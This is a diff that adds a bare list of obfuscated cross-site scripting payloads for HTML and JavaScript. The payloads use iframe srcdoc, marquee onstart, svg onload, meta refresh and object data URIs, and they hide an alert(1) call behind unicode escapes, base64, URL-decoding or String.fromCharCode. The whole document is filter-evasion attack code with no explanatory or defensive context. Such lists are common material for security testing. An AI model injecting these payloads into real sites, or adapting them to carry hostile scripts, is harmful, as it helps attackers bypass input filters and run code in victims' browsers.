@@ -1,0 +1,11 @@
+```html
+<iframe srcdoc="<img src=x onerror=window['\\u0061\\u006c\\u0065\\u0072\\u0074'](1)>"></iframe>
+<marquee onstart=eval('atob("YWxlcnQoMSk=")')>
+<svg onload=eval(decodeURIComponent('%u0061%u006c%u0065%u0072%u0074%281%29'))>
+<meta http-equiv="refresh" content="0;url=javascript:eval('al'+'ert(1)')">
+<marquee onstart=eval(atob('YWxlcnQoMSk='))>
+<object data='data:text/html,<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029`)>'></object>
+<iframe srcdoc="<svg onload=eval('String.fromCharCode(97,108,101,114,116,40,49,41)')>"></iframe>
+<marquee onstart=setTimeout(atob('YWxlcnQoMSk='),0)>
+<marquee onstart=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6C)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(1)')>
+```
